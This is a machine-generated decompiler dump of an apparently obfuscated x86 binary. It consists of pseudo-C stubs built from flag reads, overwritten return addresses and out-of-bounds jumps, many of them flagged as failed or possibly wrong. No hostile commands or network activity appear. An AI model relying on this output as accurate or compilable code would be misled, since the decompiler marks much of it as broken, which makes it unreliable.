#error "50CC8F: call analysis failed (funcsize=16)"

//----- (0050C880) --------------------------------------------------------
#error "50C885: call analysis failed (funcsize=3)"

//----- (0050C88A) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50C88A(__int16 a1@<ax>, _WORD *a2@<ebp>)
{
  __getcallerseflags();
  *a2 = a1;
  __readeflags();
  JUMPOUT(0x50B71E);
}
// 50C8A5: positive sp value 2C has been found
// 50C8A5: control flows out of bounds to 50B71E

//----- (0050C8AA) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50C8AA(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17)
{
  void *v21; // [esp-44h] [ebp-48h]
  void *retaddr; // [esp+4h] [ebp+0h]

  __asm { rep pushf }
  retaddr = v21;
  __readeflags();
  JUMPOUT(0x50CA61);
}
// 50C8B8: positive sp value 44 has been found
// 50C8B8: control flows out of bounds to 50CA61
// 50C8AC: variable 'v21' is possibly undefined

//----- (0050C8D0) --------------------------------------------------------
void sub_50C8D0()
{
  JUMPOUT(0x50B3DC);
}
// 50C8D1: control flows out of bounds to 50B3DC

//----- (0050C91C) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50C91C(int a1@<eax>, _DWORD *a2@<ebp>)
{
  *a2 = a1;
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050C93C) --------------------------------------------------------
void __userpurge sub_50C93C(
        __int16 a1@<ax>,
        int a2@<ebp>,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23)
{
  int v23; // kr04_4
  _DWORD *v24; // eax
  int v25; // edx

  *(_WORD *)(a2 - 2) = a1;
  __readeflags();
  v23 = __readeflags();
  sub_50B882(v23);
  *v24 = v25;
  JUMPOUT(0x50B71E);
}
// 50C202: control flows out of bounds to 50B71E
// 50C1EC: variable 'v25' is possibly undefined
// 50C1EC: variable 'v24' is possibly undefined

//----- (0050C95B) --------------------------------------------------------
#error "50C95B: function frame is wrong (funcsize=0)"

//----- (0050C998) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50C998(int a1@<eax>, int a2@<ebp>, int a3@<edi>)
{
  *(_WORD *)(a2 - 2) = *(_WORD *)(a1 + a3);
  __readeflags();
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050CA00) --------------------------------------------------------
#error "50B808: call analysis failed (funcsize=3)"

//----- (0050CA26) --------------------------------------------------------
#error "50BAAD: call analysis failed (funcsize=7)"

//----- (0050CA32) --------------------------------------------------------
#error "50C937: call analysis failed (funcsize=56)"

//----- (0050CAE1) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50CAE1(
        char _CF@<cf>,
        char _ZF@<zf>,
        int edi0@<edi>,
        char a1,
        int a2,
        __int16 a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20)
{
  int v23; // edx

  if ( _CF | _ZF )
  {
    sub_50C72E();
    edi0 = v23;
    __readeflags();
    __asm { rep pushf }
    JUMPOUT(0x50CA61);
  }
  ((void (*)(void))sub_50C95B)();
  sub_50C225(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, a20);
}
// 50C220: positive sp value C has been found
// 50B22F: control flows out of bounds to 50CA61
// 50B210: variable 'v23' is possibly undefined
// 50C72E: using guessed type _DWORD sub_50C72E();
// 50C95B: using guessed type _DWORD __far sub_50C95B();

//----- (0050CB0B) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_50CB0B(
        int a1@<eax>,
        _DWORD *a2@<ebp>,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23)
{
  *a2 = a1;
  __readeflags();
  __readeflags();
  JUMPOUT(0x50B71E);
}
// 50CB23: positive sp value 38 has been found
// 50CB23: control flows out of bounds to 50B71E

//----- (0050CB36) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50CB36(__int16 a1@<ax>, int a2@<ebp>)
{
  _DWORD *v2; // ebp

  v2 = (_DWORD *)(a2 - 4);
  __readeflags();
  if ( v2 )
  {
    *v2 = a1;
  }
  else
  {
    MEMORY[0] = a1;
    __readeflags();
  }
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050CB4B) --------------------------------------------------------
#error "50CB5F: call analysis failed (funcsize=21)"

//----- (0050CC57) --------------------------------------------------------
void __cdecl sub_50CC57(int a1, int a2)
{
  void *v6; // [esp+24h] [ebp-14h]
  void *retaddr; // [esp+38h] [ebp+0h]

  __readeflags();
  __readeflags();
  __readeflags();
  __asm { rep pushf }
  retaddr = v6;
  __readeflags();
  JUMPOUT(0x50CA61);
}
// 50B4EC: control flows out of bounds to 50CA61
// 50B4DE: variable 'v6' is possibly undefined

//----- (0050CC70) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50CC70(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
  void *v14; // [esp-2Ch] [ebp-30h]
  void *retaddr; // [esp+4h] [ebp+0h]

  __asm { rep pushf }
  retaddr = v14;
  JUMPOUT(0x50CA61);
}
// 50CC7E: positive sp value 28 has been found
// 50CC7E: control flows out of bounds to 50CA61
// 50CC73: variable 'v14' is possibly undefined

//----- (0050CCC2) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50CCC2(_DWORD *a1@<ebp>, int a2)
{
  int v2; // [esp-38h] [ebp-38h]

  *a1 = v2;
  __readeflags();
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA
// 50CCC6: variable 'v2' is possibly undefined

//----- (0050CCFE) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_50CCFE(
        int a1@<eax>,
        unsigned int *a2@<ebp>,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23)
{
  bool v23; // sf
  unsigned int v24; // kr04_4

  v23 = (int)(a1 + a2[1]) < 0;
  a2[1] += a1;
  __readeflags();
  v24 = __readeflags();
  if ( v23 )
    __readeflags();
  *a2 = v24;
  __readeflags();
  JUMPOUT(0x50B71E);
}
// 50B59B: positive sp value 4 has been found
// 50CD20: control flows out of bounds to 50B71E

//----- (0050CD40) --------------------------------------------------------
#error "50CD4A: call analysis failed (funcsize=53)"

//----- (0050CDA8) --------------------------------------------------------
#error "50CDA8: function frame is wrong (funcsize=0)"

//----- (0050CDB4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void sub_50CDB4()
{
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050CDC5) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_50CDC5(
        _DWORD *a1@<ebp>,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22)
{
  int v22; // [esp+4h] [ebp-4h]

  *a1 = v22;
  __readeflags();
  JUMPOUT(0x50B71E);
}
// 50CDD5: positive sp value 30 has been found
// 50CDD5: control flows out of bounds to 50B71E
// 50CDC9: variable 'v22' is possibly undefined

//----- (0050CE34) --------------------------------------------------------
void __usercall sub_50CE34(int a1@<edx>, int a2@<ebp>)
{
  sub_50C736(a1, a2);
  JUMPOUT(0x50B4FB);
}
// 50CE3C: control flows out of bounds to 50B4FB

//----- (0050CE5B) --------------------------------------------------------
#error "50CE60: call analysis failed (funcsize=2)"

//----- (0050CE65) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50CE65(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11)
{
  void *v15; // [esp-20h] [ebp-34h]
  void *retaddr; // [esp+14h] [ebp+0h]

  __readeflags();
  __asm { rep pushf }
  retaddr = v15;
  JUMPOUT(0x50CA61);
}
// 50CE90: positive sp value 24 has been found
// 50CE90: control flows out of bounds to 50CA61
// 50CE79: variable 'v15' is possibly undefined

//----- (0050CEE5) --------------------------------------------------------
#error "50CEF0: call analysis failed (funcsize=7)"

//----- (0050CF09) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50CF09(
        char a1@<cf>,
        char a2@<zf>,
        char a3@<sf>,
        char a4@<of>,
        int a5@<eax>,
        int a6@<edx>,
        int a7@<ecx>,
        int a8@<ebx>,
        int a9@<ebp>,
        int a10@<edi>,
        int a11@<esi>,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30,
        int a31,
        int a32)
{
  int v32; // [esp+20h] [ebp-4h] BYREF

  __readeflags();
  if ( a3 ^ a4 | a2 )
  {
    __readeflags();
    v32 = a8;
    sub_50C7E1(a5, a6, a7, a8, (int)&v32, a9, a10, a11);
    sub_50C80C();
  }
  else
  {
    sub_50B731(a1, a2, a3, a4, a6, a5, a6, a7, a8, (int)&a11, a9, a10, a11);
    sub_50C0E1(a10, a13, a14, a15, a16, a17, a18, a19, a20, a21, a22, a23, a24, a25, a26, a27, a28, a29, a30, a31, a32);
  }
}
// 50C0DB: positive sp value 1C has been found
// 50C0E1: using guessed type _DWORD __stdcall sub_50C0E1(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0050CF0F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_50CF0F(
        unsigned int *a1@<ebp>,
        __int16 a2,
        __int16 a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22)
{
  unsigned int v22; // kr00_4

  v22 = __getcallerseflags();
  *a1 = v22;
  JUMPOUT(0x50B71E);
}
// 50CF35: positive sp value 54 has been found
// 50CF35: control flows out of bounds to 50B71E

//----- (0050CF7C) --------------------------------------------------------
void __usercall sub_50CF7C(
        int a1@<eax>,
        int a2@<edx>,
        __int16 a3@<cx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>,
        int a8)
{
  unsigned int v8; // kr00_4
  int v9; // kr04_4
  int *v14; // [esp+18h] [ebp-14h]
  int v18; // [esp+28h] [ebp-4h] BYREF
  int retaddr; // [esp+2Ch] [ebp+0h]

  v8 = __getcallerseflags();
  v18 = v8;
  v14 = &v18;
  v9 = __readeflags();
  sub_50D759(v9, a1, a2, a3, a4, (int)v14, a5, a6, a7, v18);
  __readeflags();
  __readeflags();
  retaddr = 794439574;
  JUMPOUT(0x40804B);
}
// 50CFB0: control flows out of bounds to 40804B

//----- (0050D0D1) --------------------------------------------------------
#error "50D0D1: call analysis failed (funcsize=11)"

//----- (0050D41F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50D41F(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>,
        int a8,
        int a9,
        int a10,
        char a11,
        int a12,
        char a13,
        int a14,
        int a15,
        int a16)
{
  unsigned int v16; // kr04_4
  unsigned int v17; // kr08_4
  _DWORD *v22; // [esp+8h] [ebp-18h]
  _DWORD v26[2]; // [esp+18h] [ebp-8h] BYREF
  int retaddr; // [esp+20h] [ebp+0h]

  retaddr = -68017671;
  __readeflags();
  v16 = __readeflags();
  v26[0] = v16;
  LOBYTE(v26[0]) = 39;
  v22 = v26;
  v26[1] = a1;
  v17 = __readeflags();
  ((void (__cdecl *)(unsigned int, int, int, int, int, _DWORD *, int, int, int))sub_50CE5B)(
    v17,
    a1,
    a2,
    a3,
    a4,
    v22,
    a5,
    a6,
    a7);
  JUMPOUT(0x50CF5D);
}
// 50CF4C: positive sp value 20 has been found
// 50CF58: control flows out of bounds to 50CF5D
// 50CE5B: using guessed type _DWORD sub_50CE5B();

//----- (0050D45D) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50D45D(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  int retaddr; // [esp+Ch] [ebp+0h]

  __getcallerseflags();
  retaddr = 1461004738;
  JUMPOUT(0x50B3ED);
}
// 50B2DE: positive sp value 24 has been found
// 50B2DE: control flows out of bounds to 50B3ED

//----- (0050D616) --------------------------------------------------------
void sub_50D616()
{
  int retaddr; // [esp+0h] [ebp+0h]

  retaddr = -1787394534;
  __readeflags();
  JUMPOUT(0x50C5FE);
}
// 50D62A: control flows out of bounds to 50C5FE

//----- (0050D730) --------------------------------------------------------
void __cdecl sub_50D730(int a1)
{
  int retaddr; // [esp+24h] [ebp+0h]

  retaddr = 1520531802;
  __readeflags();
  JUMPOUT(0x50C5FE);
}
// 50D754: control flows out of bounds to 50C5FE

//----- (0050D759) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50D759(int a1, int a2, int a3, __int16 a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
  int retaddr; // [esp+Ch] [ebp+0h]

  retaddr = -703409300;
  __readeflags();
  JUMPOUT(0x50CF02);
}
// 50D77D: positive sp value 28 has been found
// 50D77D: control flows out of bounds to 50CF02

//----- (0050D796) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __stdcall sub_50D796(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21)
{
  int retaddr; // [esp+4h] [ebp+0h]

  retaddr = 1640934937;
  __readeflags();
  JUMPOUT(0x50BBF8);
}
// 50B5A0: positive sp value 24 has been found
// 50C6E8: control flows out of bounds to 50BBF8

//----- (0050DB7E) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50DB7E(
        int a1@<ebp>,
        __int128 a2@<xmm0>,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22)
{
  int v22; // [esp-54h] [ebp-54h]
  int v23; // [esp-50h] [ebp-50h]
  int v24; // [esp-4Ch] [ebp-4Ch]
  int v25; // [esp-48h] [ebp-48h]
  int v26; // [esp-44h] [ebp-44h]
  int v27; // [esp-40h] [ebp-40h]
  int v28; // [esp-3Ch] [ebp-3Ch]
  int v29; // [esp-38h] [ebp-38h]
  int v30; // [esp-34h] [ebp-34h]
  int v31; // [esp-30h] [ebp-30h]
  int v32; // [esp-2Ch] [ebp-2Ch]
  int v33; // [esp-28h] [ebp-28h]
  int v34; // [esp-24h] [ebp-24h]
  int v35; // [esp-20h] [ebp-20h]
  int v36; // [esp-1Ch] [ebp-1Ch]
  int v37; // [esp-18h] [ebp-18h]
  int v38; // [esp-14h] [ebp-14h]
  int v39; // [esp-10h] [ebp-10h]
  int v40; // [esp-Ch] [ebp-Ch]
  int v41; // [esp-8h] [ebp-8h]
  int v42; // [esp-4h] [ebp-4h]

  ((void (__stdcall *)(int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int))loc_50D0D6)(
    v22,
    v23,
    v24,
    v25,
    v26,
    v27,
    v28,
    v29,
    v30,
    v31,
    v32,
    v33,
    v34,
    v35,
    v36,
    v37,
    v38,
    v39,
    v40,
    v41,
    v42);
  *(_OWORD *)(a1 - 112) = a2;
  __readeflags();
  JUMPOUT(0x50B97B);
}
// 50DB83: positive sp value 54 has been found
// 50DF4E: control flows out of bounds to 50B97B
// 50DB7E: variable 'v22' is possibly undefined
// 50DB7E: variable 'v23' is possibly undefined
// 50DB7E: variable 'v24' is possibly undefined
// 50DB7E: variable 'v25' is possibly undefined
// 50DB7E: variable 'v26' is possibly undefined
// 50DB7E: variable 'v27' is possibly undefined
// 50DB7E: variable 'v28' is possibly undefined
// 50DB7E: variable 'v29' is possibly undefined
// 50DB7E: variable 'v30' is possibly undefined
// 50DB7E: variable 'v31' is possibly undefined
// 50DB7E: variable 'v32' is possibly undefined
// 50DB7E: variable 'v33' is possibly undefined
// 50DB7E: variable 'v34' is possibly undefined
// 50DB7E: variable 'v35' is possibly undefined
// 50DB7E: variable 'v36' is possibly undefined
// 50DB7E: variable 'v37' is possibly undefined
// 50DB7E: variable 'v38' is possibly undefined
// 50DB7E: variable 'v39' is possibly undefined
// 50DB7E: variable 'v40' is possibly undefined
// 50DB7E: variable 'v41' is possibly undefined
// 50DB7E: variable 'v42' is possibly undefined

//----- (0050DB93) --------------------------------------------------------
#error "50DB9B: cannot convert to microcode (funcsize=3)"

//----- (0050DD8A) --------------------------------------------------------
int __usercall sub_50DD8A@<eax>(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>,
        int a8,
        int a9,
        int a10)
{
  int v11; // [esp+0h] [ebp-4h] BYREF
  int retaddr; // [esp+4h] [ebp+0h]

  retaddr = -1197322818;
  __readeflags();
  v11 = -297559306;
  __readeflags();
  __readeflags();
  __readeflags();
  sub_50B898(a1, a2, a3, a4, a5, a6, a7, a1, a2, a3, a4, (int)&v11, a5, a6, a7);
  return sub_50B4F6(a8, a9, a10);
}
// 50B4F6: using guessed type _DWORD __cdecl sub_50B4F6(_DWORD, _DWORD, _DWORD);

//----- (0050DDB2) --------------------------------------------------------
void __usercall sub_50DDB2(char a1@<cf>, int a2@<eax>, int a3@<edx>, int a4@<ecx>)
{
  int retaddr; // [esp+4Ch] [ebp+0h]

  retaddr = -1197163090;
  __readeflags();
  __readeflags();
  __readeflags();
  __readeflags();
  if ( !a1 )
  {
    LOBYTE(a2) = -34;
    sub_50B4F6(a2, a3, a4);
    JUMPOUT(0x50C220);
  }
  sub_50B423(-1942481100);
  JUMPOUT(0x50C79A);
}
// 50C21B: control flows out of bounds to 50C220
// 50C795: control flows out of bounds to 50C79A
// 50B4F6: using guessed type _DWORD __cdecl sub_50B4F6(_DWORD, _DWORD, _DWORD);

//----- (0050E92C) --------------------------------------------------------
void __cdecl sub_50E92C(int a1)
{
  int retaddr; // [esp+0h] [ebp+0h]

  __readeflags();
  __readeflags();
  retaddr = 1478374288;
  __readeflags();
  JUMPOUT(0x50C5FE);
}
// 50E952: control flows out of bounds to 50C5FE

//----- (0050EEAC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50EEAC(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
  int retaddr; // [esp+Ch] [ebp+0h]

  __getcallerseflags();
  retaddr = -1982323382;
  __readeflags();
  JUMPOUT(0x40804B);
}
// 50EEBF: positive sp value 28 has been found
// 50EEBF: control flows out of bounds to 40804B

//----- (0050EF8C) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50EF8C(int a1, int a2)
{
  int retaddr; // [esp+20h] [ebp+0h]

  retaddr = 1992548897;
  sub_50B654();
  JUMPOUT(0x50CD2A);
}
// 50CD25: positive sp value 8 has been found
// 50CD25: control flows out of bounds to 50CD2A
// 50B654: using guessed type _DWORD sub_50B654();

//----- (0050EFB4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_50EFB4(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28)
{
  int v28; // kr04_4
  int v29; // eax
  int v30; // edx
  int v31; // ecx
  int v32; // eax
  int v33; // edx
  int v34; // ecx
  int v35[3]; // [esp-30h] [ebp-44h] BYREF
  int v36; // [esp-24h] [ebp-38h]
  int v37; // [esp-20h] [ebp-34h]
  int v38; // [esp-1Ch] [ebp-30h]
  int v39; // [esp-18h] [ebp-2Ch]
  int *v40; // [esp-14h] [ebp-28h]
  int v41; // [esp-10h] [ebp-24h]
  int v42; // [esp-Ch] [ebp-20h]
  int v43; // [esp-8h] [ebp-1Ch]
  int v44; // [esp-4h] [ebp-18h] BYREF
  int v45; // [esp+0h] [ebp-14h]
  int v46; // [esp+10h] [ebp-4h]
  int retaddr; // [esp+14h] [ebp+0h]

  sub_50D796(
    a1,
    a2,
    a3,
    a4,
    (int)v35,
    a5,
    a6,
    a7,
    v35[0],
    v35[1],
    v35[2],
    v36,
    v37,
    v38,
    v39,
    (int)v40,
    v41,
    -1196995202,
    v43,
    v44,
    v45);
  v45 = -1197185602;
  v28 = __readeflags();
  sub_50D45D(v29, v30, v31, a4, (int)&v44, a5, a6, a7, v28);
  retaddr = 963456399;
  v43 = a7;
  v42 = a6;
  v41 = a5;
  v40 = &v44;
  v39 = a4;
  v38 = v34;
  v37 = v33;
  v36 = v32;
  LOBYTE(v36) = 18;
  LOBYTE(v37) = 42;
  __readeflags();
  v46 = v32;
  JUMPOUT(0x50C6E8);
}
// 50B5A0: positive sp value 24 has been found
// 50B5A4: control flows out of bounds to 50C6E8
// 50D4AF: variable 'v29' is possibly undefined
// 50D4AF: variable 'v30' is possibly undefined
// 50D4AF: variable 'v31' is possibly undefined
// 50F522: variable 'v34' is possibly undefined
// 50F522: variable 'v33' is possibly undefined
// 50F522: variable 'v32' is possibly undefined

//----- (0050F201) --------------------------------------------------------
void sub_50F201()
{
  int retaddr; // [esp+4h] [ebp+0h]

  retaddr = -1197289946;
  JUMPOUT(0x50B97B);
}
// 50D602: control flows out of bounds to 50B97B

//----- (0050F2BE) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50F2BE(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11)
{
  int v11; // kr04_4
  int retaddr; // [esp+4h] [ebp+0h]

  retaddr = -960915068;
  __readeflags();
  v11 = __readeflags();
  sub_4081BA(v11);
  JUMPOUT(0x50C257);
}
// 50C24D: positive sp value 2C has been found
// 50C252: control flows out of bounds to 50C257

// nfuncs=1197 queued=466 decompiled=466 lumina nreq=0 worse=0 better=0
#error "There were 35 decompilation failure(s) on 466 function(s)"
